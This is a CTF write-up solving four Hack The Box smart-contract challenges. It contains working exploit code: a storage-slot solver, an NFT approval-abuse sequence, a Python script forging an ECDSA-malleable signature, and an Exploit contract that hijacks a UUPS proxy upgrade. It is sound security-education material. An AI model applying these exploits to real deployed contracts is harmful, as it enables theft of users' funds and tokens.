---
title: HTB University CTF  
description: Writeup for All 4 Blockchain challenges.
author: INJU
date: 2024-12-16 00:00:00 +0700
categories: [write-up, uni-ctf-htb-2024]
tags: [CTF, HackTheBox]
pin: false
math: true
mermaid: true
image:
  path: /assets/images/2024-unictf-htb/og-uni-ctf-2024.jpg
---

# First of All
Finally after some time playing Blockchain category CTF, I managed to solve all of the challenges, the first 3 was a quick and straight forward challenges but the last one I require an help froma Cryptography player (Wrth) cuz I don't really understand the ECDSA but kinda have a rough idea about the Upgradeable contract vulnerability. Kinda happy because some of my works finally showing progress!

extra!
Really glad after the party I finally understand the ECDSA and how to exploit it hahaha.

## Cryopod
### Initial Analysis

There are 2 given files `Setup.sol` and `CryoPod.sol`, however I feel that the `Setup.sol::isSolved()` doesn't really matter in this because of the actual challenge contract, here is the `CryoPod.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title CryoPod
 * @dev A smart contract that allows each user to create and store a personal pod with a piece of information.
 *      The information is stored permanently on the blockchain, and an event is emitted upon each storage action.
 */
contract CryoPod {
    mapping(address => string) private pods;

    event PodStored(address indexed user, string data);

    /**
     * @dev Stores or updates the caller's pod with the provided data.
     * @param _data The information to be stored in the user's pod.
     */
    function storePod(string memory _data) external {
        pods[msg.sender] = _data;
        emit PodStored(msg.sender, _data);
    }
}
```
{: file="CryoPod.sol"}

as the developer have stated in the comment, the contract usage is to store a personal pod with some information, this is done by the event `PodStored(address indexed user, string data)`, from this piece of inforamtion we know that the flag must be also triggering the event and all emit of event will be logged in the blockchain.

### Exploitation

It's not that hard to search for an emmited event, we just need to see the logs using `cast logs` and filter the event that we want to view

```bash
cast logs --rpc-url http://94.237.57.126:44257 "event PodStored(address indexed user, string data)" --from-block earliest --to-block latest > output.txt
```

Here is the result of the command above

```shell
.
.
.
- address: 0x9c415302c58057Ef035e991Caa71e4956D1CFC3D
  blockHash: 0x5375e62e9f51cd9730d6dfe2d45981da98bac9ec8f66d7a00a4b5be5407bc485
  blockNumber: 16
  data: 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000184854427b68336c6c305f636834316e5f736330757433727d0000000000000000
  logIndex: 0
  removed: false
  topics: [
  	0x8756f21c4a2b6b179da2cf2bfd156724e3ae8c1f5fc7d3e25d9483733e5d9221
  	0x000000000000000000000000356610ff50b8f61973d1fdbfbb00e5d643b66047
  ]
  transactionHash: 0x50ad274dbc7bad2d47d162160967e32446eae96f3fee8509db12bae4374f2ee2
  transactionIndex: 0
.
.
.
```

well, obviously there is more of the event that was emitted but we can easily filter which one contain the flag by the format, which is `HTB{.*}`, the first 3 hex would be `48 54 42` as it's the equivalent of `HTB`, and yeah, what's left is to decode the data from hex and we got the flag.

> flag: HTB{h3ll0_ch41n_sc0ut3r}

## Forgotten Artifact
### Initial Analysis

Like usual we are given 2 solidity file, `Setup.sol` and `ForgottenArtifact.sol`, the win condition this time is to access the artifact that is deployed by the Setup contract

```javascript
function isSolved() public view returns (bool) {
    return TARGET.lastSighting() > deployTimestamp;
}
```

moving to the `ForgottenArtifact.sol`,

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

contract ForgottenArtifact {
    uint256 public constant ARTIFACT_ORIGIN = 0xdead;
    uint256 public lastSighting;

    struct Artifact {
        uint32 origin;
        address discoverer;
    }

    constructor(uint32 _origin, address _discoverer) {
        Artifact storage starrySpurr;
        bytes32 seed = keccak256(abi.encodePacked(block.number, block.timestamp, msg.sender));
        assembly { starrySpurr.slot := seed }
        starrySpurr.origin = _origin;
        starrySpurr.discoverer = _discoverer;
        lastSighting = block.timestamp;
    }

    function discover(bytes32 _artifactLocation) public {
        Artifact storage starrySpurr;
        assembly { starrySpurr.slot := _artifactLocation }
        require(starrySpurr.origin == ARTIFACT_ORIGIN, "ForgottenArtifact: unknown artifact location.");
        starrySpurr.discoverer = msg.sender;
        lastSighting = block.timestamp;
    }
}
```
{: file="ForgottenArtifact.sol"}

Here we can see that there is a struct of `Artifact` consisting of `uint32 origin` and `address discoverer`. The constructor save the Artifact on a `seed` location based on a predictable block variables like `block.number`, `block.timestamp` and finally the `msg.sender`. We know for a fact that the deployment of the Setup contract and anything insite it will be happening at the first block, so the `block.number` will be `1`, as for the `block.timestamp` and `msg.sender` we can also get it pretty easy by exploring the blockchain.

Then to finally solve the challenge, we need to give the correct bytes32 of the Artifact location to access the Artifact and modify the `lastSighting`.

### Exploitation
So we already got the `block.number` which is `1`, that's one part of the puzzle, next the easy one is getting the `block.timestamp`, we can easily get this by using the command bellow

```shell
$ cast block -r http://83.136.249.47:32425 1     

baseFeePerGas        0
difficulty           0
extraData            0x
gasLimit             30000000
gasUsed              324589
hash                 0x1379bf9640a58d95e8a9a2b18690753ef091a98550ae403f074b5efd7e5624f7
logsBloom            0x00000000000000000000000000000000000000000200000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
miner                0x0000000000000000000000000000000000000000
mixHash              0x0000000000000000000000000000000000000000000000000000000000000000
nonce                0x0000000000000000
number               1
parentHash           0x3c0f91ca9a484e0eb7e70ef6dd2cfa3764478cd876287bd61fbc3640693703e6
transactionsRoot     0x1a08c751d0ee275216ce29fdf14b6cec052a6c513fc26eb94f385654845c68c0
receiptsRoot         0x2b221f4c6aa7b0967eed823d15ad1d806f50b73d8186953570e7b189858a08dc
sealFields           []
sha3Uncles           0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347
size                 1905
stateRoot            0x3c4d36f84671f1cce891241a15a3a9acadb1f3192b6cdcd0db6fccbe76da312b
timestamp            1734370349
withdrawalsRoot      0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421
totalDifficulty      0
transactions:        [
        0x950cd9f5b540cce1535cbda8576612d44583dc09df99d2a525c52058b7f97305
]
```

Using the command above we know the timestamp of `1734370349`, now what's left is the `msg.sender`. Actually it's an easy one, see the address who deploy the `ForgottenArtifact.sol` is actually the Setup, meaning the address of Setup is the `msg.sender`, with the value of `0x3CF27567BD19a9b37C2a720B12115c3222A26066`. Now what we need is to calculate the correct bytes32, I made a solver contract for this 

```javascript
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract Solver{
    function solved() public view returns(bytes32){
        return keccak256(
            abi.encodePacked(
                uint256(1), 
                uint256(1734370349), 
                address(0x3CF27567BD19a9b37C2a720B12115c3222A26066)
            )
        );
    }
}
```
{: file="Solver.sol"}

Running the `Solver.sol::solved()` will return a value of bytes32 location to access the artifact, in my case the value is `0x852456f208f39c53ea9c2b9b1487b97a04b2435648316799fa695419b0c6e6bb`, now just need to call the `discover(bytes32)` with the value 

```shell
cast send -r http://83.136.249.47:32425 --private-key 1d2a54a06e40a2c032e1882060c67fed5864bcd10413d2c275da77d8a114d269 0xFc3e5f70f59a9A5054C0f93C01CEB94c32E8a1D5 "discover(bytes32)" 0x852456f208f39c53ea9c2b9b1487b97a04b2435648316799fa695419b0c6e6bb
```

Running this will access the Artifact and update the `lastSighting` variable to the current `block.timestamp`, thus solved the challenge.

> flag: HTB{y0u_c4n7_533_m3}

## Frontier Marketplace
### Initial Analysis

We are given 3 contracts this time, `Setup.sol`, `FrontierNFT.sol`, `FrontierMarketplace.sol`– quite a lot this time, we will look carefully. Based on the `constant` declared in the Setup, we know that our initial balance is `20 Ether` and the price for each NFT is `10 Ether`, and here is the win condition

```javascript
function isSolved() public view returns (bool) {
        return (
            address(msg.sender).balance > PLAYER_STARTING_BALANCE - NFT_VALUE && 
            FrontierNFT(TARGET.frontierNFT()).balanceOf(msg.sender) > 0
        );
    }
```

The win condition is to have a balance greater than our `STARTING BALANCE - NFT VALUE` which is greater than `10 Ether` and still having an NFT. Now let's move on to the `FrontierMarketplace.sol`

```javascript
contract FrontierMarketplace {
    uint256 public constant TOKEN_VALUE = 10 ether;
    FrontierNFT public frontierNFT;
    address public owner;

    event NFTMinted(address indexed buyer, uint256 indexed tokenId);
    event NFTRefunded(address indexed seller, uint256 indexed tokenId);

    constructor() {
        frontierNFT = new FrontierNFT(address(this));
        owner = msg.sender;
    }

    function buyNFT() public payable returns (uint256) {
        require(msg.value == TOKEN_VALUE, "FrontierMarketplace: Incorrect payment amount");
        uint256 tokenId = frontierNFT.mint(msg.sender);
        emit NFTMinted(msg.sender, tokenId);
        return tokenId;
    }
    
    function refundNFT(uint256 tokenId) public {
        require(frontierNFT.ownerOf(tokenId) == msg.sender, "FrontierMarketplace: Only owner can refund NFT");
        frontierNFT.transferFrom(msg.sender, address(this), tokenId);
        payable(msg.sender).transfer(TOKEN_VALUE);
        emit NFTRefunded(msg.sender, tokenId);
    }
}
```
{: file="FrontierMarketplace.sol"}

The FrontierMarketplace Contract seems to be the communicator between us and the actual NFT contract by only having 2 function which is `buyNFT()`; for us to buy the NFT by paying `10 Ether`– then mint it to us and `refundNFT()`, which require us to input our `tokenId` then it will refund our `10 Ether` and transfer the ownership to the Marketplace contract. Now Let's move to the `FrontierNFT.sol`

We won't look at the functions that has the `onlyMarketplace` modifier since we cannot use it anyway, let's start by the function `transferFrom()`

```javascript
function transferFrom(address from, address to, uint256 tokenId) public {
    require(to != address(0), "FrontierNFT: invalid transfer receiver");
    require(from == ownerOf(tokenId), "FrontierNFT: transfer of token that is not own");
    require(
        msg.sender == from || isApprovedForAll(from, msg.sender) || msg.sender == getApproved(tokenId),
        "FrontierNFT: transfer caller is not owner nor approved"
    );

    _balances[from] -= 1;
    _balances[to] += 1;
    _owners[tokenId] = to;

    emit Transfer(from, to, tokenId);
}
```

The function require us to specify `from`, `to` and the `tokenId`– it has multiple check like the `to` must nod be `address(0)`, and make sure that we are transfering our own NFT, but there is an interesting check here, it seems that if one of the three condition on the 3rd require is fulfilled, then we can initiate the transfer, let's see the funtion

```javascript
function approve(address to, uint256 tokenId) public {
    address owner = ownerOf(tokenId);
    require(msg.sender == owner, "FrontierNFT: approve caller is not the owner");
    _tokenApprovals[tokenId] = to;
    emit Approval(owner, to, tokenId);
}

function getApproved(uint256 tokenId) public view returns (address) {
    require(_owners[tokenId] != address(0), "FrontierNFT: queried approvals for nonexistent token");
    return _tokenApprovals[tokenId];
}
```

The `approve(address to, uint256 tokenId)` will grant the `to` an approval to maintain the NFT owned the the owner who give the approval, this can be checked by calling the `getApproved()` getter function, the default value `address(0)`.

```javascript
function setApprovalForAll(address operator, bool approved) public {
    require(operator != address(0), "FrontierNFT: invalid operator");
    _operatorApprovals[msg.sender][operator] = approved;
    emit ApprovalForAll(msg.sender, operator, approved);
}

function isApprovedForAll(address owner, address operator) public view returns (bool) {
    return _operatorApprovals[owner][operator];
}
```
The other approval can be fulfilled by giving a binding approval based on the `owner`, so first it will use the `msg.sender` as the key and then the address of the `operator`, this can be done by using the `setApprovalForAll(address operator, bool approved)` and can be checked using the `isApprovedForAll(address owner, address operator)`. 

### Exploitation

Playing around using the `FrontierMarketplace`, we know that before `refundNFT()` can be called, we need to give an approval to the `FrontierMarketplace` contract, which we know we have 2 ways to do so, here is where the flaw lies

#### Flaw
The `setApprovalForAll()` will give the `operator` the managing power for all the `owner` NFT, so if an NFT is transfered the condition for this check is also shift to the key of the `new owner`, but the only way to get our Ether and NFT back is to maintain this managing power, but how?

The other way to gie approval is `approve()`, this approval is bind by the `tokenId` and not the current `owner`, so even if the NFT is already transfered to a `new owner`, if we still have the approval from `_tokenApproval[tokenId]`, we satisfy one of the three conditions

```javascript
require(
    msg.sender == from || isApprovedForAll(from, msg.sender) || msg.sender == getApproved(tokenId),
    "FrontierNFT: transfer caller is not owner nor approved"
);
```

Let's say we successfully transfered the NFT to `FrontierMarketplace`, if we still have the approval via `getApproved(tokenId)`, well well– we can still call the `transferFrom()` and take our NFT back!

#### Exploitation Steps
Based on the idea above, we have a clear step-by-step 
1. Buy an NFT via `FrontierMarketplace.sol::buyNFT()`, the `tokenId` should be 1
2. `setApprovalForAll(FrontierMarketplace, true)` - give the permission to `FrontierMarketplace Contract` 
3. give ourself the managing power using `Approve(OUR_ADDRESS, 1)` 
4. Refund the NFT using `refundNFT(1)`
5. Take back the NFT by directly calling the `trasnferFrom(FrontierMarketplace, ourWallet, 1)`
6. ensure the `isSolved()` returns true.

We can do the exploitation manually and by following the steps above, the challenge shoudl be solved.

> flag: HTB{g1mme_1t_b4ck}

## Stargazer
### Initial Analysis

We are given 3 contracts, `Setup.sol`, `Stargazer.sol` and `StargazerKernel.sol`, let's take a look at the Setup contract first because it's quite big this time,

```javascript
contract Setup {
    Stargazer public immutable TARGET_PROXY;
    StargazerKernel public immutable TARGET_IMPL;

    event DeployedTarget(address proxy, address implementation);

    constructor(bytes memory signature) payable {
        TARGET_IMPL = new StargazerKernel();
        
        string[] memory starNames = new string[](1);
        starNames[0] = "Nova-GLIM_007";
        bytes memory initializeCall = abi.encodeCall(TARGET_IMPL.initialize, starNames);
        TARGET_PROXY = new Stargazer(address(TARGET_IMPL), initializeCall);
        
        bytes memory createPASKATicketCall = abi.encodeCall(TARGET_IMPL.createPASKATicket, (signature));
        (bool success, ) = address(TARGET_PROXY).call(createPASKATicketCall);
        require(success);

        string memory starName = "Starry-SPURR_001";
        bytes memory commitStarSightingCall = abi.encodeCall(TARGET_IMPL.commitStarSighting, (starName));
        (success, ) = address(TARGET_PROXY).call(commitStarSightingCall);
        require(success);

        emit DeployedTarget(address(TARGET_PROXY), address(TARGET_IMPL));
    }

    function isSolved() public returns (bool) {
        bool success;
        bytes memory getStarSightingsCall;
        bytes memory returnData;

        getStarSightingsCall = abi.encodeCall(TARGET_IMPL.getStarSightings, ("Nova-GLIM_007"));
        (success, returnData) = address(TARGET_PROXY).call(getStarSightingsCall);
        require(success, "Setup: failed external call.");
        uint256[] memory novaSightings = abi.decode(returnData, (uint256[]));
        
        getStarSightingsCall = abi.encodeCall(TARGET_IMPL.getStarSightings, ("Starry-SPURR_001"));
        (success, returnData) = address(TARGET_PROXY).call(getStarSightingsCall);
        require(success, "Setup: failed external call.");
        uint256[] memory starrySightings = abi.decode(returnData, (uint256[]));
        
        return (novaSightings.length >= 2 && starrySightings.length >= 2);
    }
}
```
{: file="Setup.sol"}

The constructor here already has a valid signature as an input, and the first thing it does is to initialize the `StargazerKernel` Contract, then it create an array of string that can hold 2 key, the first one being the `Nova-GLIM_007` then it create a call bytes to interact with the `StargazerKernel`, to interact with it however it needs to be deliver via a proxy contract called `Stargazer`. After the first `starNames` is created then it first create a PASKATicket using the function `createPASKATicket` witht eh value of the signature given in the construcotr, then it create another one called `Starry-SPURR_001` and commit the sighting via `commitStarSightingCall`, effectively creating another sighting.

The win condition for this challenge is actually amke the sighting of the 2 stars that are registered to greater or equal to `2`,  only then the challenge will be solved. Now let's look at the proxy contract.

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract Stargazer is ERC1967Proxy {
    constructor(address _implementation, bytes memory _data) ERC1967Proxy(_implementation, _data) {}
}
```
{: file="Stargazer.sol"}

After we see the contract, we know what kind of ERC it uses, `ERC1967Proxy` and it seems that's the only information that we can get from this contract, we have to take note that it means the `Stargazer Contract` has inherited every function of the ERC1967. Moving to the `StargazerKernel.sol` we found out that it inherit everything from `UUPSUpgradeable` contract, let's see function that is quite interesting here.

```javascript
    function _recoverSigner(bytes32 _message, bytes memory _signature) internal view onlyProxy returns (address) {
        require(_signature.length == 65, "StargazerKernel: invalid signature length.");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly ("memory-safe") {
            r := mload(add(_signature, 0x20))
            s := mload(add(_signature, 0x40))
            v := byte(0, mload(add(_signature, 0x60)))
        }
        require(v == 27 || v == 28, "StargazerKernel: invalid signature version");
        address signer = ecrecover(_message, v, r, s);
        require(signer != address(0), "StargazerKernel: invalid signature.");
        return signer;
    }
```

apparently it use the `ecrecover` solidity function which is vulnerable to `Signature Malleability Attack`, we can easily craft another valid signature if we manage to knwo the value of all `r`, `s` and `v`. Looking around to see if we can get the values, I remebered that the Setup contract previously create a ticket using the `createPASKATicket` function, so I looked at it and guess what

```javascript
    function createPASKATicket(bytes memory _signature) public onlyProxy {
        StargazerMemories storage $ = _getStargazerMemory();
        uint256 nonce = $.kernelMaintainers[tx.origin].PASKATicketsNonce;
        bytes32 hashedRequest = _prefixed(
            keccak256(abi.encodePacked("PASKA: Privileged Authorized StargazerKernel Action", nonce))
        );
        PASKATicket memory newTicket = PASKATicket(hashedRequest, _signature);
        _verifyPASKATicket(newTicket);
        $.kernelMaintainers[tx.origin].PASKATickets.push(newTicket);
        $.kernelMaintainers[tx.origin].PASKATicketsNonce++;
        emit PASKATicketCreated(newTicket);
    }
```

Upon a successful function call, it will then create an event called `PASKATicketCreated(newTicket)`, the `newTicket` is a struct of `PASKATicket` which has the following structure

```javascript
    struct PASKATicket {
        bytes32 hashedRequest;
        bytes signature;
    }
```

after sometime tinkering around and trying to understand how this `ECDSA`-thing works (and trying to ask my crypto friend how to create it), I finally managed to understand it, if we managed to get the `s` of the signature we can create another valid signature by the process of `-s mod n` with `n` being the value of `secp256k1` which is `0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141` (from [standard curve database](https://neuromancer.sk/std/secg/secp256k1)). So to tackle this one we just need to find the logs of the event and get the value of `s`, but what that's not enough to solve it?

There is another function that actually made me question `"why does it even have this function in the first place? It's not being called anywhere."`, and that function was the `_authorizeUpgrade(address)` function

```javascript
    function _authorizeUpgrade(address _newImplementation) internal override onlyProxy {
        address issuer = tx.origin;
        PASKATicket memory kernelUpdateRequest = _consumePASKATicket(issuer);
        emit AuthorizedKernelUpgrade(_newImplementation);
    }
```

When dealing with ERC contract, an override is better to be watch closely, since most of the time (especially in CTF) that's the main vulnerability, in this case it's like what I thought before, nowhere in the contract called this function. So I do what people usually do when facing this kind of problem, yes, `READ MORE DOCUMENTATION!` and guess what I found after reading the `UUPSUpgradeable.sol` from [Openzeppelin contracts upgradeable](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/proxy/utils/UUPSUpgradeable.sol)

```javascript
    function upgradeToAndCall(address newImplementation, bytes memory data) public payable virtual onlyProxy {
        _authorizeUpgrade(newImplementation);
        _upgradeToAndCallUUPS(newImplementation, data);
    }
```

So something actually called this function and since the current `StargazerKernel` inherited the `UUPSUpgradable`, means that it also has this function but it's just hidden and not altered! Having a good understanding on how to exploit this contract, let's move to the exploitation part.

### Exploitation

The exploitation part consist of 2 main plot, the first one is crafting the malicious signature that we can assign it to our own address then creating another malicious contract that has the function of `getStarSightings()` overriden, so that we can always return an array length of 2, but yeah I just made it returns 4 (don't judge me).

#### Crafting the Malicious Signature

So the 1st main plot here is to get the value of the valid signature, we can use `cast logs` here to do the job, and the data should be largest one logged.

```bash
$ cast logs --rps-url $RPC_URL
```

After you found the longest data, you just need to copy the value after the `41` hex, why? after what I learned, the length of the siganture should be `65` or in hex is `41` so for example if your string look like this

```text
0x000000000000000000000000000000000000000000000000000000000000002037793dbbd614689bc7599ee3acced7f981eac27145270f8567c24c8a0989302c000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000417208185f8ae483a465547044ca497137a1f51dae97707eb2d8abcb0ec0c94f213a2a8d1637034a4f642bd31d497c39773b20c09d7f6db2ce4d0419c17a8f09641b00000000000000000000000000000000000000000000000000000000000000

(length indication of 65) - 41
( actual v r s) - 7208185f8ae483a465547044ca497137a1f51dae97707eb2d8abcb0ec0c94f213a2a8d1637034a4f642bd31d497c39773b20c09d7f6db2ce4d0419c17a8f09641b00000000000000000000000000000000000000000000000000000000000000
```

Here is my not so well-crafted script for crafting the signature

```python
import binascii

ticket_signature = "7208185f8ae483a465547044ca497137a1f51dae97707eb2d8abcb0ec0c94f213a2a8d1637034a4f642bd31d497c39773b20c09d7f6db2ce4d0419c17a8f09641b00000000000000000000000000000000000000000000000000000000000000"

ticket_signature_bytes = binascii.unhexlify(ticket_signature)

r = int.from_bytes(ticket_signature_bytes[:32], 'big')
print(f"r: {r}")

s = int.from_bytes(ticket_signature_bytes[32:64], 'big')
print(f"s: {s}")

v = int.from_bytes(ticket_signature_bytes[64:65], 'big')
print(f"v: {v}")

SECP256K1_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
mal = (-s) % SECP256K1_ORDER
print(f"s_prime: {mal}")
new_signature = ticket_signature_bytes[:32] + mal.to_bytes(32, 'big') + bytes([28])
print(f"New Signature: {new_signature.hex()}")
```
{: file="ticketer.py"}

#### StargazerKernelMod 

We knwo that we can point the proxy to interact with another contract after we call the `upgradeToAndCall(address, bytes)`, so we need to prepare a malicious contract first that actually mimic the currently active `StargazerKernel Contract`, well to do this we can just copy paste the `StargazerKernel.sol` and change it to this one

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract StargazerKernelMod is UUPSUpgradeable {
    // keccak256(abi.encode(uint256(keccak256("htb.storage.Stargazer")) - 1)) & ~bytes32(uint256(0xff));
    bytes32 private constant __STARGAZER_MEMORIES_LOCATION = 0x8e8af00ddb7b2dfef2ccc4890803445639c579a87f9cda7f6886f80281e2c800;
    
    /// @custom:storage-location erc7201:htb.storage.Stargazer
    struct StargazerMemories {
        uint256 originTimestamp; 
        mapping(bytes32 => uint256[]) starSightings;
        mapping(bytes32 => bool) usedPASKATickets;
        mapping(address => KernelMaintainer) kernelMaintainers;
    }

    struct KernelMaintainer {
        address account;
        PASKATicket[] PASKATickets;
        uint256 PASKATicketsNonce;
    }

    struct PASKATicket {
        bytes32 hashedRequest;
        bytes signature;
    }

    event PASKATicketCreated(PASKATicket ticket);
    event StarSightingRecorded(string starName, uint256 sightingTimestamp);
    event AuthorizedKernelUpgrade(address newImplementation);

    function initialize(string[] memory _pastStarSightings) public initializer onlyProxy {
        StargazerMemories storage $ = _getStargazerMemory();
        $.originTimestamp = block.timestamp;
        $.kernelMaintainers[tx.origin].account = tx.origin;
        for (uint256 i = 0; i < _pastStarSightings.length; i++) {
            bytes32 starId = keccak256(abi.encodePacked(_pastStarSightings[i]));
            $.starSightings[starId].push(block.timestamp);
        }
    }

    function createPASKATicket(bytes memory _signature) public onlyProxy {
        StargazerMemories storage $ = _getStargazerMemory();
        uint256 nonce = $.kernelMaintainers[tx.origin].PASKATicketsNonce;
        bytes32 hashedRequest = _prefixed(
            keccak256(abi.encodePacked("PASKA: Privileged Authorized StargazerKernel Action", nonce))
        );
        PASKATicket memory newTicket = PASKATicket(hashedRequest, _signature);
        _verifyPASKATicket(newTicket);
        $.kernelMaintainers[tx.origin].PASKATickets.push(newTicket);
        $.kernelMaintainers[tx.origin].PASKATicketsNonce++;
        emit PASKATicketCreated(newTicket);
    }

    function commitStarSighting(string memory _starName) public onlyProxy {
        address author = tx.origin;
        PASKATicket memory starSightingCommitRequest = _consumePASKATicket(author);
        StargazerMemories storage $ = _getStargazerMemory();
        bytes32 starId = keccak256(abi.encodePacked(_starName));
        uint256 sightingTimestamp = block.timestamp;
        $.starSightings[starId].push(sightingTimestamp);
        emit StarSightingRecorded(_starName, sightingTimestamp);
    }

    // Update this function so that it will always return an array of string of 4
    // making the check of length pass (4 >= 2 --- TRUE)
    function getStarSightings(string memory _starName) public view onlyProxy returns (uint256[] memory) {
        return new uint256[](4); 
    }

    function _getStargazerMemory() private view onlyProxy returns (StargazerMemories storage $) {
        assembly { $.slot := __STARGAZER_MEMORIES_LOCATION }
    }

    function _getKernelMaintainerInfo(address _kernelMaintainer) internal view onlyProxy returns (KernelMaintainer memory) {
        StargazerMemories storage $ = _getStargazerMemory();
        return $.kernelMaintainers[_kernelMaintainer];
    }

    function _authorizeUpgrade(address _newImplementation) internal override onlyProxy {
        address issuer = tx.origin;
        PASKATicket memory kernelUpdateRequest = _consumePASKATicket(issuer);
        emit AuthorizedKernelUpgrade(_newImplementation);
    }

    function _consumePASKATicket(address _kernelMaintainer) internal onlyProxy returns (PASKATicket memory) {
        StargazerMemories storage $ = _getStargazerMemory();
        KernelMaintainer storage maintainer = $.kernelMaintainers[_kernelMaintainer];
        PASKATicket[] storage activePASKATickets = maintainer.PASKATickets;
        require(activePASKATickets.length > 0, "StargazerKernel: no active PASKA tickets.");
        PASKATicket memory ticket = activePASKATickets[activePASKATickets.length - 1];
        bytes32 ticketId = keccak256(abi.encode(ticket));
        $.usedPASKATickets[ticketId] = true;
        activePASKATickets.pop();
        return ticket;
    }

    function _verifyPASKATicket(PASKATicket memory _ticket) internal view onlyProxy {
        StargazerMemories storage $ = _getStargazerMemory();
        address signer = _recoverSigner(_ticket.hashedRequest, _ticket.signature);
        require(_isKernelMaintainer(signer), "StargazerKernel: signer is not a StargazerKernel maintainer.");
        bytes32 ticketId = keccak256(abi.encode(_ticket));
        require(!$.usedPASKATickets[ticketId], "StargazerKernel: PASKA ticket already used.");
    }

    function _recoverSigner(bytes32 _message, bytes memory _signature) internal view onlyProxy returns (address) {
        require(_signature.length == 65, "StargazerKernel: invalid signature length.");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly ("memory-safe") {
            r := mload(add(_signature, 0x20))
            s := mload(add(_signature, 0x40))
            v := byte(0, mload(add(_signature, 0x60)))
        }
        require(v == 27 || v == 28, "StargazerKernel: invalid signature version");
        address signer = ecrecover(_message, v, r, s);
        require(signer != address(0), "StargazerKernel: invalid signature.");
        return signer;
    }

    function _isKernelMaintainer(address _account) internal view onlyProxy returns (bool) {
        StargazerMemories storage $ = _getStargazerMemory();
        return $.kernelMaintainers[_account].account == _account;
    }

    function _prefixed(bytes32 hash) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("Ethereum Signed Message:32", hash));
    }
}
```
{: file="StargazerKernelMod.sol"}

We just upgrade the `getStarSighting(string memory _starName)` to always returns array of 4 everytime it called, no matter what the string value it will return 4, which will always pass the check on `isSolved()`.

#### Exploit.sol

After we completed this 2 main preparation, we can just create a contract that will deploy the `StargazerKernelMod`, registering our signature to create the PASKATicket and then call `upgradeToAndCall(address, bytes)`,

```javascript
pragma solidity ^0.8.20;

import "./StargazerKernelMod.sol";
import "./StargazerKernel.sol";
import "./Stargazer.sol";
import "./Setup.sol";

contract Exploit {

    Setup public setup;
    Stargazer public SG;
    StargazerKernel public SK;
    StargazerKernelMod public mod;

    constructor(address _setup) {
        setup = Setup(_setup);
        SG = setup.TARGET_PROXY();
        SK = setup.TARGET_IMPL();
        mod = new StargazerKernelMod();
    }

    function exploit(bytes memory signature) public {

        bytes memory createPASKATicketCall = abi.encodeCall(SK.createPASKATicket, (signature));
        (bool success, ) = address(SG).call(createPASKATicketCall);
        require(success);

        bytes memory overtake = abi.encodeCall(SK.upgradeToAndCall, (address(mod), ""));
        (success, ) = address(SG).call(overtake);
        require(success);

        assert(setup.isSolved());

    }
}
```
{: file="exploit.sol"}

Now what left to do is just to deploy the Exploit Contract and call the `exploit(bytes memory signature)` with the crafted malicious signature value and then we good to go, as we just created a new PASKATicket for ourself with the malicious signature and then call the `upgradeToAncCall(address(mod), "")` which will make the proxy communicating to the `StargazerKernelMod` contract from now own which has the modified function that will always return array of 4 each time it called no matter the string values.

> flag: HTB{stargazer_f1nds_s0l4c3_ag41n}

